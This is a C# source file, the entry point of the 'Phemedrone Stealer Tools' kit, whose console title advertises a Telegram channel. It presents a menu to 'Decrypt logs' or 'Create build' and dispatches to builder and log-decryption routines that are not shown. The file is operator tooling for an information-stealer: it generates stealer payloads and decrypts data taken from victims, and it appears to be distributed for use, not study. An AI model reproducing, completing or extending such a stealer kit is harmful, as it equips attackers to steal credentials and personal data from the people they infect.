using System;
using System.Collections.Generic;
using System.Text;
using Phemedrone.Tools.Interface;
using Phemedrone.Tools.Interface.Settings;

namespace Phemedrone.Tools
{
    internal class Program
    {
        public static void Main()
        {
            Console.CursorVisible = false;
            Console.OutputEncoding = Encoding.UTF8;
            Console.Title = "Phemedrone Stealer Tools | t.me/freakcodingplace | Version: 2.1.0";

            var option = new OptionSelection<string>(new OptionSelectionSettings<string>
            {
                Title = "Select mode",
                Description = "Select whether you want to decrypt logs or to create a new build",
                Options = new List<string>
                {
                    "Decrypt logs",
                    "Create build"
                }
            }).Draw();

            switch (option)
            {
                case "Decrypt logs":
                    LogDecryption.Phase.Begin();
                    break;
                case "Create build":
                    Builder.Phase.Begin();
                    break;
            }
        }
    }
}